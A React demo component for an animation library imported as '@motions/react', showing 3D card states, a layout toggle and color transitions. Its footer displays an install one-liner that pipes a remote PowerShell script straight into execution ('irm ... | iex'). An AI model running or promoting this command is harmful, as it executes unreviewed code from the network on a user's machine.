
import React, { useState } from 'react';
import { motion, AnimatePresence, useCycle } from '@motions/react';
import './App.css';

function App() {
  const [count, cycleCount] = useCycle(0, 1, 2, 3);
  const [isVisible, setIsVisible] = useState(true);

  const cardVariants = {
    state0: { rotateX: 0, rotateY: 0, scale: 1, filter: 'blur(0px)' },
    state1: { rotateX: 45, rotateY: 45, scale: 1.2, filter: 'blur(2px)' },
    state2: { rotateX: -45, rotateY: 180, scale: 0.8, filter: 'grayscale(1)' },
    state3: { rotateX: 0, rotateY: 360, scale: 1.1, filter: 'hue-rotate(90deg)' }
  };

  return (
    <div className="app-container">
      <header>
        <motion.h1
          initial={{ opacity: 0, y: -50, rotateX: 90 }}
          animate={{ opacity: 1, y: 0, rotateX: 0 }}
          transition={{ spring: 'snappy' }}
        >
          MotionS <span>3D</span>
        </motion.h1>
        <p>Premium. Fluid. 3D Transforms.</p>
      </header>

      <main>
        <div className="demo-grid">
          <section className="card-demo">
            <motion.div
              className="card"
              variants={cardVariants}
              animate={`state${count}`}
              transition={{ spring: 'bouncy' }}
              whileHover={{ scale: 1.05, z: 50 }}
              whileTap={{ scale: 0.95 }}
            >
              <div className="card-content">
                <h3>Card {count}</h3>
                <p>Interactive 3D Motion</p>
              </div>
            </motion.div>
            <div className="controls">
              <button onClick={() => cycleCount()}>Next State</button>
              <p>Current: {count}</p>
            </div>
          </section>

          <section className="layout-demo">
            <button onClick={() => setIsVisible(!isVisible)}>Toggle Layout</button>
            <div className="layout-container" style={{ justifyContent: isVisible ? 'flex-start' : 'flex-end' }}>
              <motion.div
                layout
                className="box"
                transition={{ spring: 'gentle' }}
              />
            </div>
          </section>
        </div>

        <section className="color-demo">
          <motion.div
            className="color-box"
            animate={{
              backgroundColor: isVisible ? '#ff0055' : '#00ddeb',
              borderRadius: isVisible ? '20px' : '50%'
            }}
            transition={{ duration: 0.8 }}
          />
        </section>
      </main>

      <footer>
        <p>One-liner Install: <code>irm https://motions.dev/install.ps1 | iex</code></p>
      </footer>
    </div>
  );
}

export default App;
